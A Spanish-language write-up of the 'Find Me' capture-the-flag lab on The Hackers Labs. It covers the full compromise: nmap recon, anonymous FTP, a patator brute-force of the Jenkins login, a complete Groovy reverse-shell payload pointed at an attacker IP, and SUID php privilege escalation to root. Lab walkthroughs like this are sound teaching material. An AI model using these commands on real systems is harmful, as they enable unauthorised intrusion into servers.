---
layout: single
title: Find me - The Hackers Labs Write up
date: 2025-05-01
classes: wide
header:
  teaser: /assets/images/imagenfindme.jpg
  teaser_home_page: true
  icon: /assets/images/thlicon.png
categories:
  - TheHackersLabs
  - Easy
tags:
  - Easy
  - The Hackers Labs
 
---
# Find Me - Write Up - The Hackers Labs
---------------

<img src="/assets/images/findme.png" alt="Texto alternativo" width="400" />

Como siempre empezamos realizando un escaneo en este caso con **arp-scan**
para ver los dispositivos que tenemos corriendo por nuestra red local, esto lo haremos con el comando:

```bash
arp-scan -I eth0 --localnet --ignoredups` > y esto nos reporta lo siguiente:
````

En este caso nuestra máquina victima es la **192.168.1.146**

Ahora vamos a realizar un *ping* con `ping -c 2 192.168.1.146` Para ver que la máquina está bien desplegada y no nos arroja ningun tipo de error.

Y vemos que todo está bien.

<img src="/assets/images/Thehackerslabs-Findme/1.png" alt="Texto alternativo" width="400" />

**TTL 64 = Nos indica que estamos ante una máquina **Linux**

Ahora vamos a proceder al escaneo para comprobar que puertos están abiertos en dicha máquina con *Nmap*

```bash
nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 192.168.1.146 Y nos arroja lo siguiente:
```
<img src="/assets/images/Thehackerslabs-Findme/2.png" alt="Texto alternativo" width="400" />

*Encontramos abiertos los puertos 21,22,80 y 8080*

Ahora vamos a realizar un escaneo nuevamente con *nmap* para descubir que *servicios y versiones* corren para los puertos encontrados.

```bash
nmap -p21,22,80,8080 -sCV 192.168.1.146
```

<img src="/assets/images/Thehackerslabs-Findme/3.png" alt="Texto alternativo" width="400" />

El escaneo nos reporta lo siguiente, podemos ver muchas cosas pero la que a nosotros nos interesa es que por el puerto *21 FTP* está habilitado el usuario *anonymous* para poder entrar sin tener que proporcionarle contraseña.
Asique antes de nada vamos a echar un ojo por ahí a ver que nos encontramos.

```
ftp 192.168.1.146 # Ip de la máquina víctima.
```
<img src="/assets/images/Thehackerslabs-Findme/4.png" alt="Texto alternativo" width="400" />

Una vez dentro, si hacemos un **ls** nos percatamos de que hay un archivito**ayuda.txt**
asique con el comando ```get ayuda.txt``` nos vamos a traer a nuestra máquina local para poder listar su contenido.
Una vez en nuestra máquia local realizaremos un *cat* al archivo que nos hemos descargado.

```bash
cat ayuda.txt
````
Y nos arroja la siguiente información:
<img src="/assets/images/Thehackerslabs-Findme/5.png" alt="Texto alternativo" width="400" />

Aquí podemos descubrir un *usuario* potencial para el servicio **jenkins** que estará corriendo por alguno de los puertos que hemos encontrado abiertos, y otra cosa muy importante es que nos dice que la contraseña de ese usuario
tiene *5* caracteres, comienza con *p* y acaba en *a*  sería algo como: **p---a** , esto es una información muy valiosa.
Asique ahora vamos a pasar a revisar la web que está corriendo por el puerto *80* y a ver que nos encontramos.

Pero aquí no encontramos nada, solo la página por defecto de apache:

asique como anteriormente habíamos comprobado también que el puerto *8080* estaba abierto, vamos a acceder a ver que encontramos.
Y bien ! Aquí si encontramos algo, encontramos lo que mencionaba antes el usuario *Geralt* encontramos *Jenkins*

<img src="/assets/images/Thehackerslabs-Findme/6.png" alt="Texto alternativo" width="400" />

### ¿Qué es Jenkins?
> Es una herramienta de código abierto,  que se utiliza para compilar y probar proyectos de software de forma continua, lo que facilita a los desarrolladores integrar cambios en un proyecto y entregar nuevas versiones a los usuarios. Escrito en Java, es multiplataforma y accesible mediante interfaz web. Es el software más utilizado en la actualidad para este propósito.

Una vez que hemos entrado aquí y vemos que hay un panel de *login* nos tenemos que acordar de que anteriormente descubrimos un usuario potencial llamado *geralt* y a su vez vimos que decía que se había olvidado de su *password* pero que **contenia 5 caracteres y empezaba con P y acababa con A** . 

Asique llegados a este punto tenemos claro que debemos realizar un *ataque de fuerza bruta contra el panel de login*
Pero antes con todas las pistas que nos han dado vamos a utilizar la herramienta *Crunch* para crear nuestro propio diccionario con las pistas que nos habían proporcionado.

```bash
crunch 5 5 -t p@@@a -o passwords.txt
```
Una vez ejecutado el comando, vemos que nos arroja que se ha creado el diccionario satisfactoriamente con *17576* posibilidades.

<img src="/assets/images/Thehackerslabs-Findme/7.png" alt="Texto alternativo" width="400" />

Una vez tengamos el archivo **.txt** con las contraseñas que acabamos de crear, debemos crear otro archivo llamado 
**user.txt** con el usuario *geralt* que es el usuario con el que vamos a probar la fuerza bruta.

Y una vez tengamos esto ya podemos empezar con el *ataque*.
Asique bien, ahora entra en juego una herramienta llamada: *Patator* que es una herramienta super potente para realizar distintas herramientas, pero que en mi caso utilizaré para la fuerza bruta al panel de login.
Y el ataque lo haremos con el siguiente comando:

```bash
patator http_fuzz method=POST url="http://192.168.1.149:8080/j_spring_security_check" body="j_username=FILE0&j_password=FILE1&from=%2F&Submit=" 0=user.txt 1=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep="Invalid username or password" --threads=10
```

Después de lanzar el ataque y esperar un poco nos a encontrado las credenciales:
**geralt:panda**
<img src="/assets/images/Thehackerslabs-Findme/8.png" alt="Texto alternativo" width="400" />

Asique vamos a volver a la web y a intentar logearnos con las credenciales que hemos conseguido.
Y nos encontramos lo siguiente:
<img src="/assets/images/Thehackerslabs-Findme/9.png" alt="Texto alternativo" width="400" />

Ahora vamos a intentar entablar una reverse shell, y lo vamos a hacer de la siguiente manera:
Nos vamos a:

>  *maange jenkins* > *script console*

Ahora nos vamos a la conocida web de : *https://www.revshells.com/*

Le indicamos nuestra *ip* , el *puerto* por el que vamos a ponernos a la escucha y seleccionamos el lenguaje:
*goovy*. Y nos devolverá lo siguiente:

```bash
String host="192.168.1.155";int port=443;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Antes que nada debemos ponernos a la escucha por el puerto que le hayamos indicado, y después ya procedemos a enviar esa reverse shell.
Una vez que hemos conseguido entrar vemos que estamos dentro como el usuario *jenkins* , hacemos un ls y miramos ciertas cosas pero no vemos nada interesante, 
vamos a intentar migrar al usuario *geralt* ya que previamente habíamos conseguido la contraseña:

```bash
su geralt # Password = panda
````
vamos al directorio de *geralt* y con *ls* vemos un user.txt que contiene la *flag de user*

Antes de continuar deberemos realizar el tratamiento de la TTY para tenerla operativa.

```bash
script /dev/null -c bash
control + z
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=bash
```

ahora como somos el usuario *geralt* vamos a intentar la escalada de privilegios, vamos a probar buscando permisos SUID con el siguiente comando:

```bash
find / -perm -4000 2>/dev/null
```

<img src="/assets/images/Thehackerslabs-Findme/10.png" alt="Texto alternativo" width="400" />

Vemos que tenemos el binario *php8.2* que tiene permisos *SUID*
, por lo que vamos a ir a la página *gtfobins* y buscar a ver que deberiamos hacer para conseguir el abuso de ese binario.

Comprobamos que para realizar esa escalada de privilegios tenemos que usar el siguiente comando:

```bash
CMD="/bin/sh" # Como primer paso 
/usr/bin/php8.2 -r "pcntl_exec('/bin/sh', ['-p']);" # Como segundo paso.
```
somos el usuario *root* , nos movemos a su directorio ``cd /root`` y con `ls` vemos el archivito *root.txt* y si le hacemos un `cat`
vemos la flag de root.

